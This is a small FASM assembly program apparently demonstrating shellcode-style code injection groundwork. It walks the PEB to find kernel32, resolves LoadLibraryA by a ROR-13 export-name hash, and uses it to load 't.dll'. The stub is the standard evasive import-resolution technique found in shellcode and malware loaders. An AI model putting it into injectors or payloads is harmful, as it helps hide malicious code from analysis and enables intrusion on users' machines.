format pe console
entry Main

include 'INCLUDE/win32a.inc'




section '.text'  code readable executable
;==========================================

proc BeginInjection
locals
.dllName db 't.dll',0
endl

push ebx
push esi
push edi


mov ebx,[fs:dword 0x30]
mov ebx, [ebx+12]
mov ebx, [ebx+12]

Base:

mov eax, [ebx+24]
cmp eax, 0
je cleanup

mov esi, [ebx+48]
push 24
pop ecx
xor edi,edi

Collect:

xor eax,eax
lodsb
cmp al, 'a'
jl UpperCase
sub al, 32

UpperCase:
add edi, eax
loop Collect

mov eax, [ebx+24]
mov ebx, [ebx]

cmp edi, 816

jne Base


mov ebx, eax
xor edx,edx

FindFunction:

mov esi, [ebx+60]
add esi, ebx
mov esi, [esi+120]
add esi, ebx
mov esi, [esi+32]
add esi, ebx
mov esi, [esi+(edx*4)]
add esi, ebx
xor edi, edi
mov ecx, 12


CollectFunctionName:
xor eax, eax
lodsb
ror edi, 13
add edi, eax
loop CollectFunctionName

inc edx
cmp edi,0xEC0E4E8E

jne FindFunction

dec edx

mov esi, [ebx+60]
add esi, ebx
mov esi, [esi+120]
add esi, ebx
mov ecx, [esi+28]  ;Address of functions
mov edi, [esi+36]  ;Address of ordinals

add edi, ebx
add ecx, ebx

mov ax, word [edi + (edx*2)]
mov ecx, [ecx + (eax*4)]
add ecx, ebx

lea eax, [.dllName]
push eax
call ecx

cleanup:

pop edi
pop esi
pop ebx

ret

endp

Main:



call BeginInjection
  int 3

ret
;==========================================














